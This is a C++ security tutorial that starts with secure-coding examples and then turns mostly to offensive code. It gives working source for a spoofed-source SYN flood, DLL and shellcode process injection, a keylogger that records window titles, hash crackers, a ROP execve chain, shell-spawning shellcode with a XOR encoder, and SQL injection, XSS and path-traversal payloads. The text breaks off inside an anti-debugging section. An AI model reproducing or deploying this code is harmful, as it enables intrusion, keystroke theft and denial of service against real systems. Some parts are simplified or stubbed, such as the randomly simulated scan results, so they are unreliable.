# C++ for Security Guide

> A comprehensive guide to using C++ for cybersecurity applications, exploit development, and security research.  
> **Author:** c0d3Ninja  
> **Disclaimer:** This guide is for educational and authorized security research purposes only.

---

## Table of Contents

1. [Introduction](#introduction)
2. [C++ Security Fundamentals](#cpp-security-fundamentals)
3. [Memory Management & Exploitation](#memory-management--exploitation)
4. [Network Programming for Security](#network-programming-for-security)
5. [System Programming & Rootkits](#system-programming--rootkits)
6. [Cryptography Implementation](#cryptography-implementation)
7. [Reverse Engineering Tools](#reverse-engineering-tools)
8. [Exploit Development](#exploit-development)
9. [Security Tools Development](#security-tools-development)
10. [Anti-Analysis & Evasion](#anti-analysis--evasion)
11. [Practical Examples](#practical-examples)
12. [Resources & References](#resources--references)

---

## Introduction

C++ is a powerful language for cybersecurity applications due to its:
- **Low-level memory access** for exploit development
- **High performance** for security tools and scanners
- **System-level programming** capabilities for rootkits and drivers
- **Cross-platform compatibility** for portable security tools
- **Rich standard library** and extensive ecosystem

### Why C++ for Security?

```cpp
// Direct memory manipulation
char* buffer = new char[256];
memset(buffer, 0x41, 255);  // Fill with 'A'

// System-level access
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// Performance-critical operations
for(int i = 0; i < 1000000; i++) {
    // Fast scanning operations
}
```

---

## C++ Security Fundamentals

### 1. Memory Safety Concepts

```cpp
#include <iostream>
#include <memory>
#include <vector>

// Vulnerable code - Buffer overflow
void vulnerable_function() {
    char buffer[100];
    gets(buffer);  // NEVER use gets()!
}

// Safe alternative
void safe_function() {
    std::string buffer;
    std::getline(std::cin, buffer);
}

// RAII (Resource Acquisition Is Initialization)
class SecureBuffer {
private:
    std::unique_ptr<char[]> data;
    size_t size;

public:
    SecureBuffer(size_t s) : size(s), data(std::make_unique<char[]>(s)) {
        std::fill(data.get(), data.get() + size, 0);
    }
    
    ~SecureBuffer() {
        // Secure memory clearing
        if (data) {
            volatile char* ptr = data.get();
            for (size_t i = 0; i < size; ++i) {
                ptr[i] = 0;
            }
        }
    }
};
```

### 2. Secure Coding Practices

```cpp
// Input validation
bool validate_input(const std::string& input, size_t max_length) {
    if (input.length() > max_length) return false;
    
    // Check for malicious patterns
    const std::vector<std::string> dangerous_patterns = {
        "../", "..\\", "<script>", "DROP TABLE"
    };
    
    for (const auto& pattern : dangerous_patterns) {
        if (input.find(pattern) != std::string::npos) {
            return false;
        }
    }
    return true;
}

// Secure string handling
class SecureString {
private:
    std::vector<char> data;
    
public:
    SecureString(const std::string& str) {
        data.resize(str.size() + 1);
        std::copy(str.begin(), str.end(), data.begin());
        data[str.size()] = '\0';
    }
    
    ~SecureString() {
        // Secure memory wipe
        std::fill(data.begin(), data.end(), 0);
    }
    
    const char* c_str() const { return data.data(); }
};
```

---

## Memory Management & Exploitation

### 1. Buffer Overflow Detection

```cpp
#include <cstring>
#include <cassert>

class BufferOverflowDetector {
private:
    static const uint32_t CANARY_VALUE = 0xDEADBEEF;
    
public:
    struct ProtectedBuffer {
        uint32_t start_canary;
        char buffer[256];
        uint32_t end_canary;
        
        ProtectedBuffer() {
            start_canary = end_canary = CANARY_VALUE;
            memset(buffer, 0, sizeof(buffer));
        }
        
        bool is_corrupted() const {
            return (start_canary != CANARY_VALUE || end_canary != CANARY_VALUE);
        }
    };
    
    static void safe_copy(ProtectedBuffer& dest, const char* src) {
        size_t len = strlen(src);
        if (len >= sizeof(dest.buffer)) {
            throw std::runtime_error("Buffer overflow attempt detected!");
        }
        strcpy(dest.buffer, src);
        
        if (dest.is_corrupted()) {
            throw std::runtime_error("Stack canary corruption detected!");
        }
    }
};
```

### 2. Heap Exploitation Utilities

```cpp
#include <windows.h>

class HeapAnalyzer {
public:
    struct HeapChunk {
        void* address;
        size_t size;
        bool is_free;
    };
    
    static std::vector<HeapChunk> analyze_heap(HANDLE hHeap) {
        std::vector<HeapChunk> chunks;
        PROCESS_HEAP_ENTRY entry = {};
        
        if (HeapWalk(hHeap, &entry)) {
            do {
                HeapChunk chunk;
                chunk.address = entry.lpData;
                chunk.size = entry.cbData;
                chunk.is_free = (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) == 0;
                chunks.push_back(chunk);
            } while (HeapWalk(hHeap, &entry));
        }
        
        return chunks;
    }
    
    static void* find_heap_spray_target(const std::vector<HeapChunk>& chunks) {
        // Look for consistent patterns in heap layout
        for (const auto& chunk : chunks) {
            if (chunk.is_free && chunk.size >= 0x1000) {
                return chunk.address;
            }
        }
        return nullptr;
    }
};
```

---

## Network Programming for Security

### 1. Raw Socket Programming

```cpp
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#endif

class RawSocketHandler {
private:
    int sock;
    
public:
    RawSocketHandler() {
#ifdef _WIN32
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) {
            throw std::runtime_error("Failed to create raw socket");
        }
    }
    
    ~RawSocketHandler() {
#ifdef _WIN32
        closesocket(sock);
        WSACleanup();
#else
        close(sock);
#endif
    }
    
    void send_syn_flood(const std::string& target_ip, uint16_t target_port) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target.sin_addr);
        
        // Craft TCP SYN packet
        char packet[4096];
        memset(packet, 0, sizeof(packet));
        
        // IP Header
        struct iphdr* ip_header = (struct iphdr*)packet;
        ip_header->version = 4;
        ip_header->ihl = 5;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = inet_addr("192.168.1.100");  // Spoofed source
        ip_header->daddr = target.sin_addr.s_addr;
        
        // TCP Header
        struct tcphdr* tcp_header = (struct tcphdr*)(packet + sizeof(struct iphdr));
        tcp_header->source = htons(rand() % 65535);
        tcp_header->dest = htons(target_port);
        tcp_header->syn = 1;
        tcp_header->window = htons(1024);
        
        sendto(sock, packet, ntohs(ip_header->tot_len), 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
};
```

### 2. Network Scanner Implementation

```cpp
#include <thread>
#include <future>
#include <chrono>

class PortScanner {
private:
    int timeout_ms;
    
public:
    PortScanner(int timeout = 1000) : timeout_ms(timeout) {}
    
    struct ScanResult {
        uint16_t port;
        bool is_open;
        std::string service;
        std::string banner;
    };
    
    bool scan_port(const std::string& host, uint16_t port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        // Set socket timeout
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &target.sin_addr);
        
        bool is_open = (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0);
        
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        return is_open;
    }
    
    std::vector<ScanResult> scan_range(const std::string& host, 
                                     uint16_t start_port, 
                                     uint16_t end_port,
                                     int thread_count = 50) {
        std::vector<std::future<ScanResult>> futures;
        std::vector<ScanResult> results;
        
        for (uint16_t port = start_port; port <= end_port; ++port) {
            auto future = std::async(std::launch::async, [this, host, port]() {
                ScanResult result;
                result.port = port;
                result.is_open = scan_port(host, port);
                result.service = get_service_name(port);
                return result;
            });
            futures.push_back(std::move(future));
            
            // Limit concurrent threads
            if (futures.size() >= thread_count) {
                for (auto& f : futures) {
                    auto result = f.get();
                    if (result.is_open) {
                        results.push_back(result);
                    }
                }
                futures.clear();
            }
        }
        
        // Collect remaining results
        for (auto& f : futures) {
            auto result = f.get();
            if (result.is_open) {
                results.push_back(result);
            }
        }
        
        return results;
    }
    
private:
    std::string get_service_name(uint16_t port) {
        static const std::map<uint16_t, std::string> services = {
            {21, "FTP"}, {22, "SSH"}, {23, "Telnet"}, {25, "SMTP"},
            {53, "DNS"}, {80, "HTTP"}, {110, "POP3"}, {143, "IMAP"},
            {443, "HTTPS"}, {993, "IMAPS"}, {995, "POP3S"}
        };
        
        auto it = services.find(port);
        return (it != services.end()) ? it->second : "Unknown";
    }
};
```

---

## System Programming & Rootkits

### 1. Process Injection Techniques

```cpp
#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>

class ProcessInjector {
public:
    static bool inject_dll(DWORD target_pid, const std::string& dll_path) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if (!hProcess) return false;
        
        // Allocate memory in target process
        void* remote_memory = VirtualAllocEx(hProcess, nullptr, dll_path.size() + 1,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote_memory) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Write DLL path to target process
        if (!WriteProcessMemory(hProcess, remote_memory, dll_path.c_str(), 
                               dll_path.size() + 1, nullptr)) {
            VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Get LoadLibraryA address
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
        
        // Create remote thread
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
                                          (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                          remote_memory, 0, nullptr);
        
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        
        VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return hThread != nullptr;
    }
    
    static bool inject_shellcode(DWORD target_pid, const std::vector<uint8_t>& shellcode) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if (!hProcess) return false;
        
        // Allocate executable memory
        void* remote_memory = VirtualAllocEx(hProcess, nullptr, shellcode.size(),
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote_memory) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Write shellcode
        if (!WriteProcessMemory(hProcess, remote_memory, shellcode.data(),
                               shellcode.size(), nullptr)) {
            VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Execute shellcode
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
                                          (LPTHREAD_START_ROUTINE)remote_memory,
                                          nullptr, 0, nullptr);
        
        if (hThread) {
            CloseHandle(hThread);
        }
        
        CloseHandle(hProcess);
        return hThread != nullptr;
    }
};
#endif
```

### 2. Keylogger Implementation

```cpp
#ifdef _WIN32
class Keylogger {
private:
    std::ofstream log_file;
    bool running;
    std::thread capture_thread;
    
public:
    Keylogger(const std::string& log_path) : log_file(log_path), running(false) {}
    
    void start() {
        running = true;
        capture_thread = std::thread(&Keylogger::capture_keys, this);
    }
    
    void stop() {
        running = false;
        if (capture_thread.joinable()) {
            capture_thread.join();
        }
        log_file.close();
    }
    
private:
    void capture_keys() {
        while (running) {
            for (int key = 8; key <= 255; ++key) {
                if (GetAsyncKeyState(key) & 0x8000) {
                    log_key(key);
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
    }
    
    void log_key(int key) {
        std::string key_string = get_key_string(key);
        
        // Get window title for context
        char window_title[256];
        HWND foreground_window = GetForegroundWindow();
        GetWindowTextA(foreground_window, window_title, sizeof(window_title));
        
        log_file << "[" << get_timestamp() << "] "
                 << "[" << window_title << "] "
                 << key_string << std::endl;
        log_file.flush();
    }
    
    std::string get_key_string(int key) {
        switch (key) {
            case VK_SPACE: return " ";
            case VK_RETURN: return "[ENTER]";
            case VK_BACK: return "[BACKSPACE]";
            case VK_TAB: return "[TAB]";
            case VK_SHIFT: return "[SHIFT]";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_ESCAPE: return "[ESC]";
            default:
                if (key >= 0x30 && key <= 0x39) return std::string(1, key); // 0-9
                if (key >= 0x41 && key <= 0x5A) return std::string(1, key); // A-Z
                return "[" + std::to_string(key) + "]";
        }
    }
    
    std::string get_timestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
};
#endif
```

---

## Cryptography Implementation

### 1. AES Encryption Wrapper

```cpp
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

class AESCrypto {
private:
    std::vector<uint8_t> key;
    std::vector<uint8_t> iv;
    
public:
    AESCrypto() {
        generate_key();
        generate_iv();
    }
    
    void generate_key() {
        key.resize(32); // AES-256
        if (RAND_bytes(key.data(), key.size()) != 1) {
            throw std::runtime_error("Failed to generate random key");
        }
    }
    
    void generate_iv() {
        iv.resize(AES_BLOCK_SIZE);
        if (RAND_bytes(iv.data(), iv.size()) != 1) {
            throw std::runtime_error("Failed to generate random IV");
        }
    }
    
    std::vector<uint8_t> encrypt(const std::vector<uint8_t>& plaintext) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Failed to create cipher context");
        
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to initialize encryption");
        }
        
        std::vector<uint8_t> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
        int len;
        int ciphertext_len;
        
        if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to encrypt data");
        }
        ciphertext_len = len;
        
        if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to finalize encryption");
        }
        ciphertext_len += len;
        
        EVP_CIPHER_CTX_free(ctx);
        ciphertext.resize(ciphertext_len);
        return ciphertext;
    }
    
    std::vector<uint8_t> decrypt(const std::vector<uint8_t>& ciphertext) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Failed to create cipher context");
        
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to initialize decryption");
        }
        
        std::vector<uint8_t> plaintext(ciphertext.size());
        int len;
        int plaintext_len;
        
        if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to decrypt data");
        }
        plaintext_len = len;
        
        if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("Failed to finalize decryption");
        }
        plaintext_len += len;
        
        EVP_CIPHER_CTX_free(ctx);
        plaintext.resize(plaintext_len);
        return plaintext;
    }
    
    std::string get_key_hex() const {
        std::stringstream ss;
        for (auto byte : key) {
            ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
        }
        return ss.str();
    }
};
```

### 2. Hash Functions and Password Cracking

```cpp
#include <openssl/sha.h>
#include <openssl/md5.h>

class HashCracker {
public:
    static std::string md5_hash(const std::string& input) {
        unsigned char hash[MD5_DIGEST_LENGTH];
        MD5(reinterpret_cast<const unsigned char*>(input.c_str()), input.length(), hash);
        
        std::stringstream ss;
        for (int i = 0; i < MD5_DIGEST_LENGTH; ++i) {
            ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(hash[i]);
        }
        return ss.str();
    }
    
    static std::string sha256_hash(const std::string& input) {
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256(reinterpret_cast<const unsigned char*>(input.c_str()), input.length(), hash);
        
        std::stringstream ss;
        for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i) {
            ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(hash[i]);
        }
        return ss.str();
    }
    
    // Dictionary attack
    static std::string crack_hash(const std::string& target_hash, 
                                 const std::vector<std::string>& dictionary,
                                 const std::string& hash_type = "md5") {
        for (const auto& password : dictionary) {
            std::string hash;
            if (hash_type == "md5") {
                hash = md5_hash(password);
            } else if (hash_type == "sha256") {
                hash = sha256_hash(password);
            }
            
            if (hash == target_hash) {
                return password;
            }
        }
        return "";
    }
    
    // Brute force attack
    static std::string brute_force_hash(const std::string& target_hash,
                                       int max_length = 6,
                                       const std::string& charset = "abcdefghijklmnopqrstuvwxyz0123456789") {
        std::function<void(std::string, int)> generate;
        std::string result;
        
        generate = [&](std::string current, int remaining) {
            if (!result.empty()) return; // Found password
            
            if (remaining == 0) {
                if (md5_hash(current) == target_hash) {
                    result = current;
                }
                return;
            }
            
            for (char c : charset) {
                generate(current + c, remaining - 1);
            }
        };
        
        for (int len = 1; len <= max_length && result.empty(); ++len) {
            generate("", len);
        }
        
        return result;
    }
};
```

---

## Reverse Engineering Tools

### 1. PE File Parser

```cpp
#ifdef _WIN32
#include <windows.h>

class PEParser {
private:
    std::vector<uint8_t> file_data;
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS nt_headers;
    
public:
    bool load_file(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file) return false;
        
        file.seekg(0, std::ios::end);
        size_t file_size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        file_data.resize(file_size);
        file.read(reinterpret_cast<char*>(file_data.data()), file_size);
        file.close();
        
        if (file_data.size() < sizeof(IMAGE_DOS_HEADER)) return false;
        
        dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(file_data.data());
        if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) return false;
        
        if (dos_header->e_lfanew >= file_data.size()) return false;
        
        nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(file_data.data() + dos_header->e_lfanew);
        if (nt_headers->Signature != IMAGE_NT_SIGNATURE) return false;
        
        return true;
    }
    
    std::vector<std::string> get_imported_dlls() {
        std::vector<std::string> dlls;
        
        DWORD import_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (import_rva == 0) return dlls;
        
        DWORD import_offset = rva_to_offset(import_rva);
        if (import_offset == 0) return dlls;
        
        PIMAGE_IMPORT_DESCRIPTOR import_desc = 
            reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(file_data.data() + import_offset);
        
        while (import_desc->Name != 0) {
            DWORD name_offset = rva_to_offset(import_desc->Name);
            if (name_offset != 0) {
                char* dll_name = reinterpret_cast<char*>(file_data.data() + name_offset);
                dlls.push_back(std::string(dll_name));
            }
            import_desc++;
        }
        
        return dlls;
    }
    
    std::vector<std::string> get_imported_functions(const std::string& dll_name) {
        std::vector<std::string> functions;
        
        DWORD import_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (import_rva == 0) return functions;
        
        DWORD import_offset = rva_to_offset(import_rva);
        if (import_offset == 0) return functions;
        
        PIMAGE_IMPORT_DESCRIPTOR import_desc = 
            reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(file_data.data() + import_offset);
        
        while (import_desc->Name != 0) {
            DWORD name_offset = rva_to_offset(import_desc->Name);
            if (name_offset != 0) {
                char* current_dll = reinterpret_cast<char*>(file_data.data() + name_offset);
                
                if (_stricmp(current_dll, dll_name.c_str()) == 0) {
                    // Found the DLL, now get functions
                    DWORD thunk_rva = import_desc->OriginalFirstThunk;
                    if (thunk_rva == 0) thunk_rva = import_desc->FirstThunk;
                    
                    DWORD thunk_offset = rva_to_offset(thunk_rva);
                    if (thunk_offset != 0) {
                        PIMAGE_THUNK_DATA thunk = 
                            reinterpret_cast<PIMAGE_THUNK_DATA>(file_data.data() + thunk_offset);
                        
                        while (thunk->u1.AddressOfData != 0) {
                            if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                                DWORD func_offset = rva_to_offset(thunk->u1.AddressOfData);
                                if (func_offset != 0) {
                                    PIMAGE_IMPORT_BY_NAME import_name = 
                                        reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(file_data.data() + func_offset);
                                    functions.push_back(std::string(import_name->Name));
                                }
                            }
                            thunk++;
                        }
                    }
                    break;
                }
            }
            import_desc++;
        }
        
        return functions;
    }
    
private:
    DWORD rva_to_offset(DWORD rva) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
        
        for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
            if (rva >= section->VirtualAddress && 
                rva < section->VirtualAddress + section->Misc.VirtualSize) {
                return rva - section->VirtualAddress + section->PointerToRawData;
            }
            section++;
        }
        return 0;
    }
};
#endif
```

---

## Exploit Development

### 1. ROP Chain Builder

```cpp
class ROPChainBuilder {
private:
    std::vector<uint64_t> gadgets;
    std::map<std::string, uint64_t> known_gadgets;
    
public:
    ROPChainBuilder() {
        // Common x64 gadgets (would be populated from binary analysis)
        known_gadgets["pop_rax_ret"] = 0x0000000000401234;
        known_gadgets["pop_rbx_ret"] = 0x0000000000401235;
        known_gadgets["pop_rcx_ret"] = 0x0000000000401236;
        known_gadgets["pop_rdx_ret"] = 0x0000000000401237;
        known_gadgets["pop_rsi_ret"] = 0x0000000000401238;
        known_gadgets["pop_rdi_ret"] = 0x0000000000401239;
        known_gadgets["syscall_ret"] = 0x000000000040123a;
    }
    
    void add_gadget(const std::string& name, uint64_t address) {
        known_gadgets[name] = address;
    }
    
    void pop_register(const std::string& reg, uint64_t value) {
        std::string gadget_name = "pop_" + reg + "_ret";
        if (known_gadgets.find(gadget_name) != known_gadgets.end()) {
            gadgets.push_back(known_gadgets[gadget_name]);
            gadgets.push_back(value);
        }
    }
    
    void syscall() {
        if (known_gadgets.find("syscall_ret") != known_gadgets.end()) {
            gadgets.push_back(known_gadgets["syscall_ret"]);
        }
    }
    
    // Build execve("/bin/sh", NULL, NULL) ROP chain
    void build_execve_chain() {
        // execve syscall number (59 on x64 Linux)
        pop_register("rax", 59);
        
        // "/bin/sh" string address (would need to be found in binary)
        pop_register("rdi", 0x0000000000404000);
        
        // NULL for argv
        pop_register("rsi", 0);
        
        // NULL for envp
        pop_register("rdx", 0);
        
        // Execute syscall
        syscall();
    }
    
    std::vector<uint8_t> generate_payload() {
        std::vector<uint8_t> payload;
        
        for (uint64_t gadget : gadgets) {
            // Little-endian encoding
            for (int i = 0; i < 8; i++) {
                payload.push_back((gadget >> (i * 8)) & 0xFF);
            }
        }
        
        return payload;
    }
    
    void print_chain() {
        std::cout << "ROP Chain:" << std::endl;
        for (size_t i = 0; i < gadgets.size(); i++) {
            std::cout << "[" << i << "] 0x" << std::hex << gadgets[i] << std::endl;
        }
    }
};
```

### 2. Shellcode Generator

```cpp
class ShellcodeGenerator {
public:
    // Linux x64 execve("/bin/sh") shellcode
    static std::vector<uint8_t> linux_x64_execve() {
        return {
            0x48, 0x31, 0xf6,                               // xor rsi, rsi
            0x56,                                           // push rsi
            0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rdi, "/bin/sh"
            0x57,                                           // push rdi
            0x54,                                           // push rsp
            0x5f,                                           // pop rdi
            0x6a, 0x3b,                                     // push 59 (execve syscall)
            0x58,                                           // pop rax
            0x99,                                           // cdq (rdx = 0)
            0x0f, 0x05                                      // syscall
        };
    }
    
    // Windows x64 WinExec("cmd.exe", SW_HIDE) shellcode
    static std::vector<uint8_t> windows_x64_winexec() {
        return {
            0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 40
            0x48, 0x31, 0xC9,                               // xor rcx, rcx
            0x48, 0x81, 0xE9, 0x3F, 0xFF, 0xFF, 0xFF,       // sub rcx, 0xFFFFFFC1
            0x48, 0x8D, 0x05, 0x0A, 0x00, 0x00, 0x00,       // lea rax, [rip + cmdexe]
            0x48, 0x89, 0xC1,                               // mov rcx, rax
            0x48, 0x31, 0xD2,                               // xor rdx, rdx
            0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,             // call [rip + winexec]
            0xEB, 0x08,                                     // jmp short end
            // WinExec address (would be resolved at runtime)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // "cmd.exe" string
            0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00
        };
    }
    
    // Polymorphic XOR encoder
    static std::vector<uint8_t> xor_encode(const std::vector<uint8_t>& shellcode, uint8_t key = 0) {
        if (key == 0) {
            key = static_cast<uint8_t>(rand() % 255 + 1); // Avoid NULL byte
        }
        
        std::vector<uint8_t> encoded = shellcode;
        for (auto& byte : encoded) {
            byte ^= key;
        }
        
        // XOR decoder stub
        std::vector<uint8_t> decoder = {
            0xEB, 0x0B,                                     // jmp short get_shellcode_addr
            0x5E,                                           // pop rsi (shellcode address)
            0x31, 0xC9,                                     // xor ecx, ecx
            0x6A, static_cast<uint8_t>(encoded.size()),    // push shellcode_len
            0x59,                                           // pop rcx
            0x80, 0x36, key,                                // xor byte ptr [rsi], key
            0x46,                                           // inc esi
            0xE2, 0xFA,                                     // loop decode_loop
            0xEB, 0x05,                                     // jmp short shellcode
            0xE8, 0xF0, 0xFF, 0xFF, 0xFF                    // call get_shellcode_addr
        };
        
        decoder.insert(decoder.end(), encoded.begin(), encoded.end());
        return decoder;
    }
    
    // Alpha-numeric encoder (simplified)
    static std::vector<uint8_t> alphanumeric_encode(const std::vector<uint8_t>& shellcode) {
        std::vector<uint8_t> encoded;
        
        for (uint8_t byte : shellcode) {
            // Simple encoding - each byte becomes two alphanumeric bytes
            uint8_t high = (byte >> 4) + 0x41;  // A-P
            uint8_t low = (byte & 0x0F) + 0x41; // A-P
            encoded.push_back(high);
            encoded.push_back(low);
        }
        
        return encoded;
    }
};
```

---

## Security Tools Development

### 1. Vulnerability Scanner Framework

```cpp
class VulnerabilityScanner {
private:
    struct Vulnerability {
        std::string id;
        std::string name;
        std::string description;
        std::string severity;
        std::function<bool(const std::string&, int)> check_function;
    };
    
    std::vector<Vulnerability> vulnerability_database;
    
public:
    VulnerabilityScanner() {
        initialize_vulnerability_database();
    }
    
    void initialize_vulnerability_database() {
        // SQL Injection check
        vulnerability_database.push_back({
            "SQLI-001",
            "SQL Injection",
            "Potential SQL injection vulnerability detected",
            "HIGH",
            [](const std::string& host, int port) {
                return check_sql_injection(host, port);
            }
        });
        
        // XSS check
        vulnerability_database.push_back({
            "XSS-001",
            "Cross-Site Scripting",
            "Potential XSS vulnerability detected",
            "MEDIUM",
            [](const std::string& host, int port) {
                return check_xss(host, port);
            }
        });
        
        // Directory traversal
        vulnerability_database.push_back({
            "DT-001",
            "Directory Traversal",
            "Directory traversal vulnerability detected",
            "HIGH",
            [](const std::string& host, int port) {
                return check_directory_traversal(host, port);
            }
        });
    }
    
    struct ScanResult {
        std::string target;
        std::vector<Vulnerability> found_vulnerabilities;
        std::chrono::duration<double> scan_time;
    };
    
    ScanResult scan_target(const std::string& host, int port = 80) {
        auto start_time = std::chrono::high_resolution_clock::now();
        
        ScanResult result;
        result.target = host + ":" + std::to_string(port);
        
        for (const auto& vuln : vulnerability_database) {
            if (vuln.check_function(host, port)) {
                result.found_vulnerabilities.push_back(vuln);
            }
        }
        
        auto end_time = std::chrono::high_resolution_clock::now();
        result.scan_time = end_time - start_time;
        
        return result;
    }
    
private:
    static bool check_sql_injection(const std::string& host, int port) {
        // Simple SQL injection test
        std::vector<std::string> payloads = {
            "' OR '1'='1",
            "' UNION SELECT 1--",
            "'; DROP TABLE users--"
        };
        
        for (const auto& payload : payloads) {
            std::string url = "http://" + host + ":" + std::to_string(port) + "/login?user=" + payload;
            
            // Simulate HTTP request (would use actual HTTP library)
            if (simulate_http_request(url)) {
                return true;
            }
        }
        return false;
    }
    
    static bool check_xss(const std::string& host, int port) {
        std::vector<std::string> payloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        };
        
        for (const auto& payload : payloads) {
            std::string url = "http://" + host + ":" + std::to_string(port) + "/search?q=" + payload;
            
            if (simulate_http_request(url)) {
                return true;
            }
        }
        return false;
    }
    
    static bool check_directory_traversal(const std::string& host, int port) {
        std::vector<std::string> payloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        };
        
        for (const auto& payload : payloads) {
            std::string url = "http://" + host + ":" + std::to_string(port) + "/file?path=" + payload;
            
            if (simulate_http_request(url)) {
                return true;
            }
        }
        return false;
    }
    
    static bool simulate_http_request(const std::string& url) {
        // Simplified HTTP request simulation
        // In real implementation, would use libcurl or similar
        std::cout << "Testing: " << url << std::endl;
        return (rand() % 10) < 2; // 20% chance of vulnerability
    }
};
```

---

## Anti-Analysis & Evasion

### 1. Anti-Debugging Techniques

```cpp
#ifdef _WIN32
class AntiDebug {
public:
    static bool is_debugger_present_api() {
